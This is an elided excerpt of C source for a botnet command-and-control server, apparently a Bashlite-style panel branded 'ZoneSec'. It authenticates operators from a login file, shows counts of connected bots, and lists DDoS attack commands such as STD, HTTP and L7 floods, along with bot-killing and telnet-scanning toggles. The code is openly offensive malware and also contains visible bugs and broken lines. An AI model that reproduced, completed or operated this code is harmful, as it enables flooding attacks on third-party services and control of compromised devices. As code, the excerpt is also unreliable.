...
P.S. > the login file name is love.txt
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
...
void *titleWriter(void *sock) 
{
        ...
        while(1)
        {
                ...
                sprintf(string, "%c]0; ZoneSec ~ Doxed Rejects: %d ~ Memers: %d %c", '\033', clientsConnected(), managesConnected, '\007');
...
void *telnetWorker(void *sock) { 
        ...
        int i=0;
        int c;
        fp=fopen("love.txt", "r"); // format: user pass
        while(!feof(fp)) 
        {
                c=fgetc(fp);
                ++i;
		...
		sprintf(line23, "     "C_RESET"***"RED" Welcome To The CatfishSec"C_RESET" ***\r\n\r\n"C_RESET"~"RED"$ "C_RESET"");
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        ...
        if(strstr(buf, "BOTS")) 
        {  
          sprintf(botnet, "Bots Connected: "RED"[%d]"C_RESET"\r\nAdmins connected: "RED"[%d]"C_RESET"\r\nDupes Deleted:"RED" [%d]"C_RESET"\r\n", clientsConnected(), managesConnected, DUPESDELETED);
...
if(strstr(buf, "HELP")) {
				...
				sprintf(ddosline2, "\x1b[0;37m !* STD [IP] [PORT] [TIME] | STD FLOOD\r\n");
				...
				sprintf(ddosline32, "\x1b[0;37m !* HTTP <URL> GET|POST|HEAD <PORT> / <TIME> 1024 | L7 Flood\r\n");
				sprintf(ddosline11, "\x1b[0;31m !* L33T-L7 <URL> <PORT> <TIME> | L33T-L7 Flood\r\n");
				sprintf(ddosline12, "\x1b[0;37m !* STOP | STOPS ALL ATTACKS\r\n");
				sprintf(ddosline13, "\x1v[0;37m !* NETIS ON | !* TELNET ON | !* LOOPME | !* BOTKILL")
				...
				if(send(thefd, ddosline12,  strlen(ddosline13),	MSG_NOSIGNAL) == -1) goto end;
				pthread_create(&title, NULL, &titleWriter, sock);
				while(1) {
				if(send(thefd, "\x1b[0;31m~$ \x1b[1;36m", 12, MSG_NOSIGNAL) == -1) goto end;
				break;
		...
		sprintf(ascii_banner_line21, "\x1b[0;31m         ║  ║ ║╚╗╔╝║╣ ╚═╗║╣ ║  \r\n");
		sprintf(ascii_banner_line22, "\x1b[0m         ╩═╝╚═╝ ╚╝ ╚═╝╚═╝╚═╝╚═╝\r\n");
		sprintf(line23, "     "C_RESET"***"RED" Welcome To The ZoneSec"C_RESET" ***\r\n ");
		if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line20, strlen(ascii_banner_line20), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line21, strlen(ascii_banner_line21), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line22, strlen(ascii_banner_line22), MSG_NOSIGNAL) == -1) goto end;
...
int main (int argc, char *argv[], void *sock)
{
        ...
        printf(RED "\x1b[0;31mTHIS SHIT PRIVATE,\x1b[1;37m DO NOT FUCKING LEAK, \x1b[1;37mZoneMeme \x1b[1;37mBOTNET \x1b[1;36mSCREENED\x1b[0m\n");
